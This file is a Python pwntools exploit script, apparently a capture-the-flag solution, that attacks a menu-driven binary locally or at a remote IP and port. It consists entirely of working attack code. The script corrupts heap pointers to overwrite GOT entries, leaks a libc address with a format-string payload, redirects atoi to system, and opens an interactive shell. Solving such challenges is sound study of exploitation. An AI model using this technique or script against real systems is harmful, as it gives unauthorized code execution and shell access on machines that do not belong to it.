#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '178.62.40.102'
port = 6000

binary = "./c"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def create(name, kind , old):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil("> ")
  r.send(name)
  r.recvuntil("> ")
  r.send(kind)
  r.recvuntil("> ")
  r.sendline(str(old))
  pass

def edit(index,name,kind,old,option):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil("> ")
  r.sendline(str(index))
  r.recvuntil("> ")
  r.send(name)
  r.recvuntil("> ")
  r.send(kind)
  r.recvuntil("> ")
  r.sendline(str(old))
  r.recvuntil("> ")
  r.sendline(option)

  pass

def delete(index):
  r.recvuntil("> ")
  r.sendline("5")
  r.recvuntil("> ")
  r.sendline(str(index))
  pass

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

puts_got = 0x00602028
printf_plt = 0x004006D0
main_start_got = 0x602050
atoi_got = 0x00602068
heap_ptr = 0x06020A0
free_got = 0x000602018

ptr = 0x006020F0

if __name__ == '__main__':
  create("123","213",123)
  edit(0,"A"*8 , "A"*8, 1,"n")
  create("A"*0x10,p64(ptr) + p64(free_got)[:-1],123)
  edit(0,p64(ptr)  + p64(free_got), p64(printf_plt), 1,"n")
  create("A","%17$pp",123)
  delete(2)
  libc.address = int(r.recvuntil("\xf0")[:-1],16) - 0x20830
  print "libc =" , hex(libc.address)
  edit(0,p64(ptr)+p64(atoi_got), p64(libc.symbols["system"]), 1,"n")
  r.recvuntil("> ")
  r.sendline("sh")

  r.interactive()

